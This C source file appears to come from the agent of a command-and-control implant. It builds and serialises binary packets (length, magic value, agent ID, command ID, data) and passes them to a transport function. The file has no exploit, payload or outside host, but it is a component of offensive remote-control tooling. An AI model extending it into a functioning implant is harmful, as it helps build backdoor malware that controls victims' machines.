#include "Package.h"
#include "Transport.h"

extern UINT32 g_AgentID;

VOID Int32ToBuffer(PUCHAR buf, UINT32 val){
    buf[0] = (val >> 24) & 0xFF;
    buf[1] = (val >> 16) & 0xFF;
    buf[2] = (val >> 8 ) & 0xFF;
    buf[3] = (val ) & 0xFF;
}

VOID PackageAddInt32(PPACKAGE Package, UINT32 data){
    // FIX: Check LocalReAlloc result before using it
    PVOID temp = LocalReAlloc(Package->Buffer, Package->Length + 4, LMEM_MOVEABLE);
    if (!temp) {
        printf("[ERROR] Failed to allocate memory in PackageAddInt32\n");
        return;
    }
    Package->Buffer = temp;
    Int32ToBuffer(Package->Buffer + Package->Length, data);
    Package->Length += 4;
}

VOID PackageAddBytes(PPACKAGE Package, PUCHAR Data, SIZE_T Size){
    if (Size > 0x1FFFFFFF) {
        printf("[ERROR] PackageAddBytes: Size too large (%zu bytes)\n", Size);
        return;
    }
    PackageAddInt32(Package, Size);
    PVOID temp = LocalReAlloc(Package->Buffer, Package->Length + Size, LMEM_MOVEABLE | LMEM_ZEROINIT);
    if (!temp) {
        printf("[ERROR] Failed to allocate memory in PackageAddBytes\n");
        return;
    }
    Package->Buffer = temp;
    memcpy(Package->Buffer + Package->Length, Data, Size);
    Package->Length += Size;
}

PPACKAGE PackageCreate(UINT32 CommandID){
    PPACKAGE pkg = LocalAlloc(LPTR, sizeof(PACKAGE));
    if (!pkg) {
        printf("[ERROR] Failed to allocate PACKAGE structure\n");
        return NULL;
    }
    pkg->Buffer = LocalAlloc(LPTR, sizeof(BYTE));
    if (!pkg->Buffer) {
        LocalFree(pkg);
        printf("[ERROR] Failed to allocate Package buffer\n");
        return NULL;
    }
    pkg->Length = 0;
    pkg->CommandID = CommandID;
    PackageAddInt32(pkg, 0);
    PackageAddInt32(pkg, MAYO_MAGIC);
    PackageAddInt32(pkg, g_AgentID);
    PackageAddInt32(pkg, CommandID);
    return pkg;
}

VOID PackageDestroy(PPACKAGE Package){
    if (!Package) return;
    if (Package->Buffer){
        memset(Package->Buffer, 0, Package->Length);
        LocalFree(Package->Buffer);
    }
    memset(Package, 0, sizeof(PACKAGE));
    LocalFree(Package);
}

BOOL PackageTransmit(PPACKAGE Package, PVOID* Response, PSIZE_T Size){
    if (!Package) return FALSE;
    Int32ToBuffer(Package->Buffer, Package->Length - 4);
    BOOL ok = TransportSend(Package->Buffer, Package->Length, Response, Size);
    PackageDestroy(Package);
    return ok;
}
